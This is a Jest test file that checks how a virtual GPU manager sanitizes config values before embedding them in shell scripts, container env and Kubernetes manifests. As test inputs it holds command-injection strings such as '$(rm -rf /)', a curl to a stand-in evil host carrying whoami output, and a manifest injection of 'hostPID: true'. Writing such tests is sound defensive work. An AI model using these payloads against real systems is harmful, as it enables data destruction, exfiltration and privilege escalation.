// virtual-gpu-manager のプロビジョニング config サニタイズ検証。
// createVirtualGPU の config 由来値（computePercentage / memoryLimit / cpuLimit）は
// MPS シェルスクリプト・コンテナ env・k8s manifest へ埋め込まれる。
// 生のままだと "50; <任意コマンド>" 形式の値がシェル行として実行され得るため、
// 数値クランプ / k8s quantity 検証で防御する。
const fsPromises = require('fs').promises;
const {
  VirtualGPUManager,
  clampPercentage,
  safeK8sQuantity,
  safePositiveNumber,
} = require('../../virtual-gpu-manager');

const physicalGPU = {
  id: 'gpu0',
  name: 'RTX 4090',
  model: { series: 'RTX' },
  vram: 24576,
  cudaCores: 16384,
  tensorCores: 512,
  memoryBandwidth: 1008,
};

afterEach(() => {
  jest.restoreAllMocks();
});

describe('clampPercentage', () => {
  it('数値化不能・範囲外の値を既定値/0-100へ正規化する', () => {
    expect(clampPercentage('50; touch /tmp/pwn')).toBe(50); // 注入文字列 → 既定
    expect(clampPercentage('$(rm -rf /)')).toBe(50);
    expect(clampPercentage(200)).toBe(100);
    expect(clampPercentage(-5)).toBe(0);
    expect(clampPercentage(30)).toBe(30);
    expect(clampPercentage(undefined)).toBe(50);
  });
});

describe('safeK8sQuantity / safePositiveNumber', () => {
  it('k8s quantity 形式のみ受理し、それ以外は既定値へ', () => {
    expect(safeK8sQuantity('16Gi', '8Gi')).toBe('16Gi');
    expect(safeK8sQuantity('500m', '4')).toBe('500m');
    expect(safeK8sQuantity('4; echo pwn', '4')).toBe('4');
    expect(safeK8sQuantity('8Gi && curl evil', '8Gi')).toBe('8Gi');
    expect(safeK8sQuantity(undefined, '8Gi')).toBe('8Gi');
  });

  it('正の有限数のみ受理し、それ以外は既定値へ', () => {
    expect(safePositiveNumber(1024, 8)).toBe(1024);
    expect(safePositiveNumber('8;rm -rf /', 8)).toBe(8);
    expect(safePositiveNumber(-1, 8)).toBe(8);
    expect(safePositiveNumber(NaN, 8)).toBe(8);
  });
});

describe('createVirtualGPU の config サニタイズ', () => {
  it('docker 経路: 悪意ある computePercentage が env に数値のみで埋め込まれる', async () => {
    jest.spyOn(fsPromises, 'mkdir').mockResolvedValue(undefined);
    const mgr = new VirtualGPUManager();
    mgr.platform = 'docker';
    mgr.physicalGPUs = new Map([['gpu0', physicalGPU]]);
    let captured;
    mgr.docker = {
      createContainer: async (cfg) => {
        captured = cfg;
        return { id: 'ctr-1', start: async () => {} };
      },
    };
    jest.spyOn(mgr, 'saveVirtualGPUConfig').mockResolvedValue(undefined);

    await mgr.createVirtualGPU(physicalGPU, {
      computePercentage: '80; curl https://evil.example/$(whoami)',
      memoryLimit: '8Gi; rm -rf /',
      cpuLimit: '4; id',
    });

    const mpsEnv = captured.Env.find((e) => e.startsWith('CUDA_MPS_ACTIVE_THREAD_PERCENTAGE='));
    expect(mpsEnv).toBe('CUDA_MPS_ACTIVE_THREAD_PERCENTAGE=50'); // 既定値へ正規化
    expect(captured.Env.join(' ')).not.toContain('curl');
    expect(captured.HostConfig.Resources.Memory).toBe(8 * 1024 * 1024 * 1024);
    expect(captured.HostConfig.Resources.CpuShares).toBe(4 * 1024);
  });

  it('kubernetes 経路: 非 quantity の memory/cpu limit を既定値へフォールバック', async () => {
    const mgr = new VirtualGPUManager();
    mgr.platform = 'kubernetes';
    mgr.physicalGPUs = new Map([['gpu0', physicalGPU]]);
    let capturedPod;
    mgr.k8sApi = {
      createNamespacedConfigMap: async () => ({}),
      createNamespacedPod: async (ns, manifest) => {
        capturedPod = manifest;
        return { body: { metadata: { name: 'pod-1' } } };
      },
    };
    jest.spyOn(mgr, 'saveVirtualGPUConfig').mockResolvedValue(undefined);

    await mgr.createVirtualGPU(physicalGPU, {
      computePercentage: '1; touch /tmp/pwn',
      memoryLimit: '1Gi\nhostPID: true', // manifest 注入試行
      cpuLimit: '10000m',
    });

    const limits = capturedPod.spec.containers[0].resources.limits;
    expect(limits.memory).toBe('8Gi');          // 注入文字列 → 既定
    expect(limits.cpu).toBe('10000m');          // 正規 quantity は受理
    const env = capturedPod.spec.containers[0].env.find((e) => e.name === 'CUDA_MPS_ACTIVE_THREAD_PERCENTAGE');
    expect(env.value).toBe('50');
    expect(JSON.stringify(capturedPod)).not.toContain('hostPID');
  });

  it('native (MPS) 経路: 生成シェルスクリプトへ数値のみ埋め込む', async () => {
    const written = [];
    jest.spyOn(fsPromises, 'mkdir').mockResolvedValue(undefined);
    jest.spyOn(fsPromises, 'writeFile').mockImplementation(async (p, c) => {
      written.push({ path: p, content: c });
    });
    const mgr = new VirtualGPUManager();
    mgr.platform = 'native';
    mgr.physicalGPUs = new Map([['gpu0', physicalGPU]]);
    mgr.migSupported = false;
    mgr.vgpuSupported = false;
    jest.spyOn(mgr, 'saveVirtualGPUConfig').mockResolvedValue(undefined);

    // start-mps.sh の exec は実ファイル不在で失敗するが、検証対象は生成内容
    await expect(mgr.createVirtualGPU(physicalGPU, {
      computePercentage: '70\nrm -rf / #',
    })).rejects.toThrow();

    const script = written.find((w) => w.path.endsWith('start-mps.sh'));
    expect(script).toBeTruthy();
    expect(script.content).toContain('CUDA_MPS_ACTIVE_THREAD_PERCENTAGE=50');
    expect(script.content).not.toContain('rm -rf');
  });
});
